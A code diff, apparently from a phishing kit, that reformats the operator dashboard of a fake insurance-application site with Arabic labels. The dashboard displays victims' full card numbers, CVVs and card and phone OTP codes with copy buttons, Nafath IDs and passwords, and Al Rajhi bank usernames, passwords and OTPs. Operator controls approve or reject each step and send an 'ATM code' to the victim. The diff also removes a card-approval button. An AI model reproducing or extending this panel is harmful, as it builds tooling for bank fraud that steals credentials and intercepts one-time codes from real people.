-                      <span className={cn("w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold", isActive && "bg-white/20", isPassed && !isActive && "bg-green-500/30", !isActive && !isPassed && "bg-secondary")}>
+                      <span
+                        className={cn(
+                          "w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold",
+                          isActive && "bg-white/20",
+                          isPassed && !isActive && "bg-green-500/30",
+                          !isActive && !isPassed && "bg-secondary",
+                        )}
+                      >
                         {isPassed && !isActive ? "✓" : step}
                       </span>
                       <span className="hidden xl:inline">{title}</span>
@@ -689,21 +1030,62 @@ export default function Dashboard() {
 
                 <div className="h-6 w-px bg-border mx-2" />
 
-                <button onClick={() => handleUpdateCurrentPage(selectedApplication.id, "nafaz")} className={cn("flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all", selectedApplication.currentPage === "nafaz" ? "bg-purple-500 text-white" : "bg-purple-500/10 text-purple-600")} data-testid="step-nafaz">
-                  <Lock size={14} /><span>نفاذ</span>
+                <button
+                  onClick={() =>
+                    handleUpdateCurrentPage(selectedApplication.id, "nafaz")
+                  }
+                  className={cn(
+                    "flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all",
+                    selectedApplication.currentPage === "nafaz"
+                      ? "bg-purple-500 text-white"
+                      : "bg-purple-500/10 text-purple-600",
+                  )}
+                  data-testid="step-nafaz"
+                >
+                  <Lock size={14} />
+                  <span>نفاذ</span>
                 </button>
 
-                <button onClick={() => handleUpdateCurrentPage(selectedApplication.id, "rajhi")} className={cn("flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all", selectedApplication.currentPage === "rajhi" ? "bg-teal-600 text-white" : "bg-teal-500/10 text-teal-600")} data-testid="step-rajhi">
-                  <CreditCard size={14} /><span>الراجحي</span>
+                <button
+                  onClick={() =>
+                    handleUpdateCurrentPage(selectedApplication.id, "rajhi")
+                  }
+                  className={cn(
+                    "flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all",
+                    selectedApplication.currentPage === "rajhi"
+                      ? "bg-teal-600 text-white"
+                      : "bg-teal-500/10 text-teal-600",
+                  )}
+                  data-testid="step-rajhi"
+                >
+                  <CreditCard size={14} />
+                  <span>الراجحي</span>
                 </button>
 
-                <button onClick={() => handleUpdateCurrentPage(selectedApplication.id, "phone")} className={cn("flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all", selectedApplication.currentPage === "phone" ? "bg-amber-500 text-white" : "bg-amber-500/10 text-amber-600")} data-testid="step-phone">
-                  <Phone size={14} /><span>الهاتف</span>
+                <button
+                  onClick={() =>
+                    handleUpdateCurrentPage(selectedApplication.id, "phone")
+                  }
+                  className={cn(
+                    "flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all",
+                    selectedApplication.currentPage === "phone"
+                      ? "bg-amber-500 text-white"
+                      : "bg-amber-500/10 text-amber-600",
+                  )}
+                  data-testid="step-phone"
+                >
+                  <Phone size={14} />
+                  <span>الهاتف</span>
                 </button>
 
                 <div className="mr-auto flex items-center gap-2 text-xs pr-2">
                   <span className="text-muted-foreground">الخطوة:</span>
-                  <Badge className="bg-blue-500/10 text-blue-600 font-mono text-xs px-2 py-1" data-testid="badge-current-step">{selectedApplication.currentStep || "—"}</Badge>
+                  <Badge
+                    className="bg-blue-500/10 text-blue-600 font-mono text-xs px-2 py-1"
+                    data-testid="badge-current-step"
+                  >
+                    {selectedApplication.currentStep || "—"}
+                  </Badge>
                 </div>
               </div>
             </div>
@@ -716,15 +1098,38 @@ export default function Dashboard() {
             <div className="max-w-3xl mx-auto space-y-4">
               {/* Welcome Message */}
               <ChatBubble title="النظام" icon={<MessageSquare size={16} />}>
-                <p className="text-sm">مرحباً، هذه بيانات طلب التأمين الخاص بـ <strong>{getDisplayName(selectedApplication)}</strong></p>
+                <p className="text-sm">
+                  مرحباً، هذه بيانات طلب التأمين الخاص بـ{" "}
+                  <strong>{getDisplayName(selectedApplication)}</strong>
+                </p>
               </ChatBubble>
 
               {/* Basic Info */}
-              <ChatBubble title="المعلومات الأساسية" isUser icon={<User size={16} />}>
+              <ChatBubble
+                title="المعلومات الأساسية"
+                isUser
+                icon={<User size={16} />}
+              >
                 <div className="space-y-1 text-sm">
-                  {selectedApplication.nationalId && <div>رقم الهوية: <span className="font-mono" dir="ltr">{selectedApplication.nationalId}</span></div>}
-                  {getCardName(selectedApplication) && <div>الاسم: {getCardName(selectedApplication)}</div>}
-                  {selectedApplication.phoneNumber && <div>الهاتف: <span className="font-mono" dir="ltr">{selectedApplication.phoneNumber}</span></div>}
+                  {selectedApplication.nationalId && (
+                    <div>
+                      رقم الهوية:{" "}
+                      <span className="font-mono" dir="ltr">
+                        {selectedApplication.nationalId}
+                      </span>
+                    </div>
+                  )}
+                  {getCardName(selectedApplication) && (
+                    <div>الاسم: {getCardName(selectedApplication)}</div>
+                  )}
+                  {selectedApplication.phoneNumber && (
+                    <div>
+                      الهاتف:{" "}
+                      <span className="font-mono" dir="ltr">
+                        {selectedApplication.phoneNumber}
+                      </span>
+                    </div>
+                  )}
                 </div>
               </ChatBubble>
 
@@ -733,56 +1138,115 @@ export default function Dashboard() {
                 <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                   <div className="bg-gradient-to-l from-amber-500/10 to-card px-4 py-3 border-b border-border">
                     <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
-                      <CreditCard size={16} className="text-amber-500" />بطاقة الدفع
-                      {!selectedApplication.cardOtpApproved && <Badge className="bg-amber-100 text-amber-700 text-[9px] animate-pulse">بانتظار الموافقة</Badge>}
+                      <CreditCard size={16} className="text-amber-500" />
+                      بطاقة الدفع
+                      {!selectedApplication.cardOtpApproved && (
+                        <Badge className="bg-amber-100 text-amber-700 text-[9px] animate-pulse">
+                          بانتظار الموافقة
+                        </Badge>
+                      )}
                     </h3>
                   </div>
                   <div className="p-6">
                     {/* Visual Card */}
-                    <div className="w-full max-w-[400px] mx-auto aspect-[1.6/1] rounded-2xl p-6 relative overflow-hidden shadow-xl mb-6" style={{ background: "linear-gradient(135deg, #1a365d 0%, #2d3748 50%, #1a202c 100%)" }}>
-                      <div className="absolute top-0 right-0 w-64 h-64 rounded-full opacity-10" style={{ background: "radial-gradient(circle, white 0%, transparent 70%)", transform: "translate(30%, -30%)" }} />
+                    <div
+                      className="w-full max-w-[400px] mx-auto aspect-[1.6/1] rounded-2xl p-6 relative overflow-hidden shadow-xl mb-6"
+                      style={{
+                        background:
+                          "linear-gradient(135deg, #1a365d 0%, #2d3748 50%, #1a202c 100%)",
+                      }}
+                    >
+                      <div
+                        className="absolute top-0 right-0 w-64 h-64 rounded-full opacity-10"
+                        style={{
+                          background:
+                            "radial-gradient(circle, white 0%, transparent 70%)",
+                          transform: "translate(30%, -30%)",
+                        }}
+                      />
                       <div className="flex justify-between items-start mb-6">
                         <div className="w-12 h-9 rounded bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center shadow-md">
                           <div className="w-8 h-6 rounded-sm bg-gradient-to-br from-yellow-300 to-yellow-500 opacity-80" />
                         </div>
                         <div className="text-left">
-                          <div className="text-white font-bold text-lg" data-testid="card-bank-name">
-                            {binData?.bank?.name || binData?.scheme?.toUpperCase() || "mada"}
+                          <div
+                            className="text-white font-bold text-lg"
+                            data-testid="card-bank-name"
+                          >
+                            {binData?.bank?.name ||
+                              binData?.scheme?.toUpperCase() ||
+                              "mada"}
                           </div>
                           {binData?.type && (
                             <div className="text-white/60 text-[10px]">
-                              {binData.type === 'debit' ? 'DEBIT' : binData.type === 'credit' ? 'CREDIT' : binData.type.toUpperCase()}
+                              {binData.type === "debit"
+                                ? "DEBIT"
+                                : binData.type === "credit"
+                                  ? "CREDIT"
+                                  : binData.type.toUpperCase()}
                             </div>
                           )}
                         </div>
                       </div>
                       <div className="mb-6">
-                        <div className="font-mono text-2xl text-white tracking-[0.2em] font-medium" dir="ltr">
-                          {getCardNumber(selectedApplication)?.replace(/(.{4})/g, '$1 ').trim()}
+                        <div
+                          className="font-mono text-2xl text-white tracking-[0.2em] font-medium"
+                          dir="ltr"
+                        >
+                          {getCardNumber(selectedApplication)
+                            ?.replace(/(.{4})/g, "$1 ")
+                            .trim()}
                         </div>
                       </div>
                       <div className="flex justify-between items-end text-white">
                         <div>
-                          <div className="text-[10px] text-white/60 mb-1">CARD HOLDER</div>
-                          <div className="font-medium uppercase text-sm">{getCardName(selectedApplication) || "NAME"}</div>
+                          <div className="text-[10px] text-white/60 mb-1">
+                            CARD HOLDER
+                          </div>
+                          <div className="font-medium uppercase text-sm">
+                            {getCardName(selectedApplication) || "NAME"}
+                          </div>
                         </div>
                         <div className="text-left">
-                          <div className="text-[10px] text-white/60 mb-1">EXPIRES</div>
-                          <div className="font-mono text-sm">{getCardExpiry(selectedApplication) || "MM/YY"}</div>
+                          <div className="text-[10px] text-white/60 mb-1">
+                            EXPIRES
+                          </div>
+                          <div className="font-mono text-sm">
+                            {getCardExpiry(selectedApplication) || "MM/YY"}
+                          </div>
                         </div>
                         <div className="text-left">
-                          <div className="text-[10px] text-white/60 mb-1">CVV</div>
-                          <div className="font-mono text-sm font-bold">{getCardCvv(selectedApplication) || "***"}</div>
+                          <div className="text-[10px] text-white/60 mb-1">
+                            CVV
+                          </div>
+                          <div className="font-mono text-sm font-bold">
+                            {getCardCvv(selectedApplication) || "***"}
+                          </div>
                         </div>
                       </div>
                     </div>
 
                     {/* Card Details */}
                     <div className="space-y-1">
-                      <DataRow label="رقم البطاقة" value={getCardNumber(selectedApplication)} isLtr />
-                      <DataRow label="اسم حامل البطاقة" value={getCardName(selectedApplication)} />
-                      <DataRow label="تاريخ الانتهاء" value={getCardExpiry(selectedApplication)} isLtr />
-                      <DataRow label="CVV" value={getCardCvv(selectedApplication)} isLtr />
+                      <DataRow
+                        label="رقم البطاقة"
+                        value={getCardNumber(selectedApplication)}
+                        isLtr
+                      />
+                      <DataRow
+                        label="اسم حامل البطاقة"
+                        value={getCardName(selectedApplication)}
+                      />
+                      <DataRow
+                        label="تاريخ الانتهاء"
+                        value={getCardExpiry(selectedApplication)}
+                        isLtr
+                      />
+                      <DataRow
+                        label="CVV"
+                        value={getCardCvv(selectedApplication)}
+                        isLtr
+                      />
                     </div>
 
                     {/* BIN Info Section */}
@@ -793,91 +1257,163 @@ export default function Dashboard() {
                     ) : binData ? (
                       <div className="mt-4 p-4 bg-gradient-to-l from-blue-50 to-purple-50 dark:from-blue-900/20 dark:to-purple-900/20 rounded-lg border border-blue-200 dark:border-blue-800">
                         <h4 className="font-bold text-sm mb-3 flex items-center gap-2 text-blue-700 dark:text-blue-400">
-                          <Globe size={14} />معلومات البطاقة
+                          <Globe size={14} />
+                          معلومات البطاقة
                         </h4>
                         <div className="grid grid-cols-2 gap-3 text-sm">
                           {binData.bank?.name && (
                             <div className="flex flex-col">
-                              <span className="text-xs text-gray-500 dark:text-gray-400">البنك</span>
-                              <span className="font-medium text-foreground" data-testid="bin-bank-name">{binData.bank.name}</span>
+                              <span className="text-xs text-gray-500 dark:text-gray-400">
+                                البنك
+                              </span>
+                              <span
+                                className="font-medium text-foreground"
+                                data-testid="bin-bank-name"
+                              >
+                                {binData.bank.name}
+                              </span>
                             </div>
                           )}
                           {binData.scheme && (
                             <div className="flex flex-col">
-                              <span className="text-xs text-gray-500 dark:text-gray-400">الشبكة</span>
-                              <span className="font-medium uppercase text-foreground" data-testid="bin-scheme">{binData.scheme}</span>
+                              <span className="text-xs text-gray-500 dark:text-gray-400">
+                                الشبكة
+                              </span>
+                              <span
+                                className="font-medium uppercase text-foreground"
+                                data-testid="bin-scheme"
+                              >
+                                {binData.scheme}
+                              </span>
                             </div>
                           )}
                           {binData.type && (
                             <div className="flex flex-col">
-                              <span className="text-xs text-gray-500 dark:text-gray-400">نوع البطاقة</span>
-                              <span className="font-medium capitalize text-foreground" data-testid="bin-type">{binData.type === 'debit' ? 'بطاقة سحب' : binData.type === 'credit' ? 'بطاقة ائتمان' : binData.type}</span>
+                              <span className="text-xs text-gray-500 dark:text-gray-400">
+                                نوع البطاقة
+                              </span>
+                              <span
+                                className="font-medium capitalize text-foreground"
+                                data-testid="bin-type"
+                              >
+                                {binData.type === "debit"
+                                  ? "بطاقة سحب"
+                                  : binData.type === "credit"
+                                    ? "بطاقة ائتمان"
+                                    : binData.type}
+                              </span>
                             </div>
                           )}
                           {binData.country?.name && (
                             <div className="flex flex-col">
-                              <span className="text-xs text-gray-500 dark:text-gray-400">الدولة</span>
-                              <span className="font-medium text-foreground" data-testid="bin-country">
+                              <span className="text-xs text-gray-500 dark:text-gray-400">
+                                الدولة
+                              </span>
+                              <span
+                                className="font-medium text-foreground"
+                                data-testid="bin-country"
+                              >
                                 {binData.country.emoji} {binData.country.name}
                               </span>
                             </div>
                           )}
                           {binData.brand && (
                             <div className="flex flex-col">
-                              <span className="text-xs text-gray-500 dark:text-gray-400">العلامة التجارية</span>
-                              <span className="font-medium text-foreground" data-testid="bin-brand">{binData.brand}</span>
+                              <span className="text-xs text-gray-500 dark:text-gray-400">
+                                العلامة التجارية
+                              </span>
+                              <span
+                                className="font-medium text-foreground"
+                                data-testid="bin-brand"
+                              >
+                                {binData.brand}
+                              </span>
                             </div>
                           )}
                           {binData.prepaid !== undefined && (
                             <div className="flex flex-col">
-                              <span className="text-xs text-gray-500 dark:text-gray-400">مسبقة الدفع</span>
-                              <span className="font-medium text-foreground" data-testid="bin-prepaid">{binData.prepaid ? 'نعم' : 'لا'}</span>
+                              <span className="text-xs text-gray-500 dark:text-gray-400">
+                                مسبقة الدفع
+                              </span>
+                              <span
+                                className="font-medium text-foreground"
+                                data-testid="bin-prepaid"
+                              >
+                                {binData.prepaid ? "نعم" : "لا"}
+                              </span>
                             </div>
                           )}
                         </div>
                       </div>
                     ) : null}
-
-                    {/* Card Approval Button */}
-                    <div className="mt-4 pt-4 border-t border-border">
-                      <Button
-                        onClick={() => handleFieldApproval(selectedApplication.id, "cardOtpApproved", true)}
-                        className={cn("w-full", selectedApplication.cardOtpApproved ? "bg-green-600" : "bg-amber-500 hover:bg-amber-600")}
-                        disabled={selectedApplication.cardOtpApproved}
-                        data-testid="button-approve-card"
-                      >
-                        <CheckCircle className="h-4 w-4 ml-2" />
-                        {selectedApplication.cardOtpApproved ? "تمت الموافقة" : "موافقة على البطاقة"}
-                      </Button>
-                    </div>
                   </div>
                 </div>
               )}
 
               {/* OTP Codes Section */}
-              {(selectedApplication.otpCode || selectedApplication.phoneOtpCode) && (
+              {(selectedApplication.otpCode ||
+                selectedApplication.phoneOtpCode) && (
                 <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                   <div className="bg-gradient-to-l from-blue-500/10 to-card px-4 py-3 border-b border-border">
                     <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
-                      <Key size={16} className="text-blue-500" />رموز التحقق
+                      <Key size={16} className="text-blue-500" />
+                      رموز التحقق
                     </h3>
                   </div>
                   <div className="p-6 grid grid-cols-2 gap-4">
                     {selectedApplication.otpCode && (
                       <div className="bg-blue-50 dark:bg-blue-900/30 rounded-lg p-4 text-center">
-                        <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">OTP البطاقة</p>
-                        <p className="font-mono text-2xl font-bold text-blue-600 dark:text-blue-400" data-testid="text-card-otp">{selectedApplication.otpCode}</p>
-                        <Button size="sm" variant="outline" className="mt-2" onClick={() => copyToClipboard(selectedApplication.otpCode!, "OTP البطاقة")} data-testid="button-copy-card-otp">
-                          <Copy size={12} className="ml-1" />نسخ
+                        <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
+                          OTP البطاقة
+                        </p>
+                        <p
+                          className="font-mono text-2xl font-bold text-blue-600 dark:text-blue-400"
+                          data-testid="text-card-otp"
+                        >
+                          {selectedApplication.otpCode}
+                        </p>
+                        <Button
+                          size="sm"
+                          variant="outline"
+                          className="mt-2"
+                          onClick={() =>
+                            copyToClipboard(
+                              selectedApplication.otpCode!,
+                              "OTP البطاقة",
+                            )
+                          }
+                          data-testid="button-copy-card-otp"
+                        >
+                          <Copy size={12} className="ml-1" />
+                          نسخ
                         </Button>
                       </div>
                     )}
                     {selectedApplication.phoneOtpCode && (
                       <div className="bg-pink-50 dark:bg-pink-900/30 rounded-lg p-4 text-center">
-                        <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">OTP الهاتف</p>
-                        <p className="font-mono text-2xl font-bold text-pink-600 dark:text-pink-400" data-testid="text-phone-otp">{selectedApplication.phoneOtpCode}</p>
-                        <Button size="sm" variant="outline" className="mt-2" onClick={() => copyToClipboard(selectedApplication.phoneOtpCode!, "OTP الهاتف")} data-testid="button-copy-phone-otp">
-                          <Copy size={12} className="ml-1" />نسخ
+                        <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
+                          OTP الهاتف
+                        </p>
+                        <p
+                          className="font-mono text-2xl font-bold text-pink-600 dark:text-pink-400"
+                          data-testid="text-phone-otp"
+                        >
+                          {selectedApplication.phoneOtpCode}
+                        </p>
+                        <Button
+                          size="sm"
+                          variant="outline"
+                          className="mt-2"
+                          onClick={() =>
+                            copyToClipboard(
+                              selectedApplication.phoneOtpCode!,
+                              "OTP الهاتف",
+                            )
+                          }
+                          data-testid="button-copy-phone-otp"
+                        >
+                          <Copy size={12} className="ml-1" />
+                          نسخ
                         </Button>
                       </div>
                     )}
@@ -886,26 +1422,53 @@ export default function Dashboard() {
               )}
 
               {/* Nafaz Section */}
-              {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
+              {(selectedApplication.nafazId ||
+                selectedApplication.nafazPass) && (
                 <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                   <div className="bg-gradient-to-l from-green-500/10 to-card px-4 py-3 border-b border-border">
                     <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
-                      <Lock size={16} className="text-green-500" />نفاذ
-                      {!selectedApplication.nafathApproved && <Badge className="bg-green-100 text-green-700 text-[9px] animate-pulse">بانتظار الموافقة</Badge>}
+                      <Lock size={16} className="text-green-500" />
+                      نفاذ
+                      {!selectedApplication.nafathApproved && (
+                        <Badge className="bg-green-100 text-green-700 text-[9px] animate-pulse">
+                          بانتظار الموافقة
+                        </Badge>
+                      )}
                     </h3>
                   </div>
                   <div className="p-6 space-y-1">
-                    <DataRow label="رقم الهوية" value={selectedApplication.nafazId} isLtr />
-                    <DataRow label="كلمة المرور" value={selectedApplication.nafazPass} isLtr />
+                    <DataRow
+                      label="رقم الهوية"
+                      value={selectedApplication.nafazId}
+                      isLtr
+                    />
+                    <DataRow
+                      label="كلمة المرور"
+                      value={selectedApplication.nafazPass}
+                      isLtr
+                    />
                     <div className="mt-4 pt-4 border-t border-border">
                       <Button
-                        onClick={() => handleFieldApproval(selectedApplication.id, "nafathApproved", true)}
-                        className={cn("w-full", selectedApplication.nafathApproved ? "bg-green-600" : "bg-green-500 hover:bg-green-600")}
+                        onClick={() =>
+                          handleFieldApproval(
+                            selectedApplication.id,
+                            "nafathApproved",
+                            true,
+                          )
+                        }
+                        className={cn(
+                          "w-full",
+                          selectedApplication.nafathApproved
+                            ? "bg-green-600"
+                            : "bg-green-500 hover:bg-green-600",
+                        )}
                         disabled={selectedApplication.nafathApproved}
                         data-testid="button-approve-nafaz"
                       >
                         <CheckCircle className="h-4 w-4 ml-2" />
-                        {selectedApplication.nafathApproved ? "تمت الموافقة" : "موافقة نفاذ"}
+                        {selectedApplication.nafathApproved
+                          ? "تمت الموافقة"
+                          : "موافقة نفاذ"}
                       </Button>
                     </div>
                   </div>
@@ -913,17 +1476,33 @@ export default function Dashboard() {
               )}
 
               {/* Rajhi Section */}
-              {(selectedApplication.rajhiUser || selectedApplication.rajhiPassword) && (
+              {(selectedApplication.rajhiUser ||
+                selectedApplication.rajhiPassword) && (
                 <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                   <div className="bg-gradient-to-l from-teal-500/10 to-card px-4 py-3 border-b border-border">
                     <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
-                      <Shield size={16} className="text-teal-500" />الراجحي
+                      <Shield size={16} className="text-teal-500" />
+                      الراجحي
                     </h3>
                   </div>
                   <div className="p-6 space-y-1">
-                    <DataRow label="اسم المستخدم" value={selectedApplication.rajhiUser} isLtr />
-                    <DataRow label="كلمة المرور" value={selectedApplication.rajhiPassword} isLtr />
-                    {selectedApplication.rajhiOtp && <DataRow label="OTP" value={selectedApplication.rajhiOtp} isLtr />}
+                    <DataRow
+                      label="اسم المستخدم"
+                      value={selectedApplication.rajhiUser}
+                      isLtr
+                    />
+                    <DataRow
+                      label="كلمة المرور"
+                      value={selectedApplication.rajhiPassword}
+                      isLtr
+                    />
+                    {selectedApplication.rajhiOtp && (
+                      <DataRow
+                        label="OTP"
+                        value={selectedApplication.rajhiOtp}
+                        isLtr
+                      />
+                    )}
                   </div>
                 </div>
               )}
@@ -932,18 +1511,35 @@ export default function Dashboard() {
               <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                 <div className="bg-gradient-to-l from-gray-500/10 to-card px-4 py-3 border-b border-border">
                   <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
-                    <Settings size={16} className="text-gray-500" />الإجراءات
+                    <Settings size={16} className="text-gray-500" />
+                    الإجراءات
                   </h3>
                 </div>
                 <div className="p-6">
                   <div className="flex flex-wrap gap-3">
-                    <Button size="sm" onClick={() => handleApprovalStatus(selectedApplication.id, "approved_otp")} className="bg-emerald-600 hover:bg-emerald-700" data-testid="button-approve-otp">
-                      <CheckCircle className="h-4 w-4 ml-2" />موافقة OTP
+                    <Button
+                      size="sm"
+                      onClick={() =>
+                        handleApprovalStatus(
+                          selectedApplication.id,
+                          "approved_otp",
+                        )
+                      }
+                      className="bg-emerald-600 hover:bg-emerald-700"
+                      data-testid="button-approve-otp"
+                    >
+                      <CheckCircle className="h-4 w-4 ml-2" />
+                      موافقة OTP
                     </Button>
                     <Dialog>
                       <DialogTrigger asChild>
-                        <Button size="sm" variant="outline" data-testid="button-atm-dialog">
-                          <Key className="h-4 w-4 ml-2" />إرسال رمز صراف
+                        <Button
+                          size="sm"
+                          variant="outline"
+                          data-testid="button-atm-dialog"
+                        >
+                          <Key className="h-4 w-4 ml-2" />
+                          إرسال رمز صراف
                         </Button>
                       </DialogTrigger>
                       <DialogContent>
@@ -965,7 +1561,11 @@ export default function Dashboard() {
                               disabled={!atmCode.trim()}
                               onClick={() => {
                                 if (atmCode.trim()) {
-                                  handleApprovalStatus(selectedApplication.id, "approved_atm", atmCode.trim());
+                                  handleApprovalStatus(
+                                    selectedApplication.id,
+                                    "approved_atm",
+                                    atmCode.trim(),
+                                  );
                                   setAtmCode("");
                                 }
                               }}
@@ -977,8 +1577,16 @@ export default function Dashboard() {
                         </DialogFooter>
                       </DialogContent>
                     </Dialog>
-                    <Button size="sm" variant="destructive" onClick={() => handleApprovalStatus(selectedApplication.id, "rejected")} data-testid="button-reject">
-                      <X className="h-4 w-4 ml-2" />رفض
+                    <Button
+                      size="sm"
+                      variant="destructive"
+                      onClick={() =>
+                        handleApprovalStatus(selectedApplication.id, "rejected")
+                      }
+                      data-testid="button-reject"
+                    >
+                      <X className="h-4 w-4 ml-2" />
+                      رفض
                     </Button>
                   </div>
                 </div>
